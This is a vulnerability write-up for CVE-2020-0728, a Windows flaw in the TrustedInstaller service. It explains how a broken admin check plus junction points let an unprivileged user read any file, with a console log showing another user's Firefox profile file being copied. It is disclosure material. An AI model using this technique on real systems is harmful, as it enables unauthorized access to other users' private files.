CVE-2020-0728
=============

Details
-------

The `TrustedInstaller.exe` service is running as `NT_AUTHORITY\SYSTEM` and is hosting the Sxs Store Class (`3C6859CE-230B-48A4-BE6C-932C0C202048`) COM service along with the interface `ISxsStore`. 
The access permissions (O:BAG:BAD:(A;;CCDCLC;;;PS)(A;;CCDC;;;SY)(A;;CCDC;;;BA)(A;;CCDC;;;IU)(A;;CCDC;;;SU)) of this service grants access to any users 
on the local system.
The `ISxsStore` interface exposes 4 methods:

```
[Guid("8601319a-d7cf-40f3-9025-7f77125453c6")]
interface ISxsStore : IUnknown {
    HRESULT BeginAssemblyInstall(/* Stack Offset: 8 */ [In] int p0);
    HRESULT InstallAssembly(/* Stack Offset: 8 */ [In] int p0, /* Stack Offset: 16 */ [In] wchar_t* p1, /* Stack Offset: 24 */ [In] struct Struct_0* p2, /* Stack Offset: 32 */ [In] struct Struct_1* p3);
    HRESULT EndAssemblyInstall(/* Stack Offset: 8 */ [In] int p0, /* Stack Offset: 16 */ [Out] int* p1);
    HRESULT UninstallAssembly(/* Stack Offset: 8 */ [In] int p0, /* Stack Offset: 16 */ [In] wchar_t* p1, /* Stack Offset: 24 */ [In] struct Struct_1* p2, /* Stack Offset: 32 */ [In] int* p3);
}
```

Upon invocation, the implementation calls out to the `ICbsWorker` interface hosted by `TiWorker.exe` (again, running as `NT_AUTHORITY\SYSTEM`) to obtain an `ICbsSession8` session
and then practically calls the same methods on this interface.
The real logic is implemented in the `sxsstore.dll` library; authorization can be found in `CSxsStore::BeginAssemblyInstall`:

```
uVar1 = SxspEnsureComClientIsAdmin((void **)this);
```

This is done using `CoImpersonateClient`+`CheckTokenMembership` calls.

The problem is, if the session hosted by the `TiWorker.exe` process is invoked via the `TrustedInstaller.exe` wrapper, the authorization logic implemented always encounters connections from `NT_AUTHORITY\SYSTEM`
and thus grants access to anyone.

The assemblies requested to be installed are placed under `C:\Windows\WinSXS` by the implementation residing in `wcp.dll` (`Windows::COM::CComponentStore::InternalTransact`) and
seems to feature sufficient security measures to protect these method calls to escape from this legitimate destination directory, but the source files referenced by the 
manifest can be abused via junction points.

This can be exploited to bypass file system DAC and read any files on the local filesystem as demonstrated below:


```
	Microsoft Windows [Version 10.0.18362.592]
	(c) 2019 Microsoft Corporation. All rights reserved.

	C:\Projects\windows-dcom-hacks\work\Windows Modules Installer\weapon>whoami
	desktop-43rnlku\unprivileged

	C:\Projects\windows-dcom-hacks\work\Windows Modules Installer\weapon>whoami /priv

	PRIVILEGES INFORMATION
	----------------------

	Privilege Name                Description                          State
	============================= ==================================== ========
	SeShutdownPrivilege           Shut down the system                 Disabled
	SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
	SeUndockPrivilege             Remove computer from docking station Disabled
	SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
	SeTimeZonePrivilege           Change the time zone                 Disabled


	C:\Projects\windows-dcom-hacks\work\Windows Modules Installer\weapon>type "C:\Users\John Doe\AppData\Roaming\Mozilla\Firefox\profiles.ini"
	Access is denied.


	C:\Projects\windows-dcom-hacks\work\Windows Modules Installer\weapon>sxscopy.exe "C:\Users\John Doe\AppData\Roaming\Mozilla\Firefox\profiles.ini" profiles.ini
	sxscopy: C:\Users\John Doe\AppData\Roaming\Mozilla\Firefox\profiles.ini => profiles.ini
	Creating helper junction sxscopy.junction -> C:\
	Junction created for sxscopy.junction <<===>> C:\
	Executing DCOM magic with manifest file C:\Projects\windows-dcom-hacks\work\Windows Modules Installer\weapon\sxscopy.manifest
	Exploitation has succeeded, copy of the source file was placed inside WinSXS
	Copy has succeeded!

	C:\Projects\windows-dcom-hacks\work\Windows Modules Installer\weapon>type profiles.ini
	[Install308046B0AF4A39CB]
	Default=Profiles/5bqqo33l.default
	Locked=1

	[Profile2]
	Name=johndoe
	IsRelative=1
	Path=Profiles/5bqqo33l.default
	Default=1

	[Profile1]
	Name=default
	IsRelative=1
	Path=Profiles/x89vbmzf.default

	[Profile0]
	Name=default-release
	IsRelative=1
	Path=Profiles/1kmhc44f.default-release

	[General]
	StartWithLastProfile=1
	Version=2
```

The wcp framework is actually quite complex and and features various 'installers' (e.g. GenericCommand execution among the 'advanced' ones), 
but the interface accessible above seems to be limited to only the 'primitive installers'. I could trigger executing 
`CRegistryInstaller::CommitChanges` that emitted log to `C:\Windows\Logs\CBS\CBS.log`, lines like:

```
2020-01-18 15:58:16, Info                  CSI    0000000c Registry installer wrote xxx values
```

But it actually never really called any API methods to change anything in the registry. 


Credits
-------
The report above along with the PoC code was submitted by Imre Rad but was also identified by researchers of NCC (actually a few months earlier).

Links
-----
https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-0728
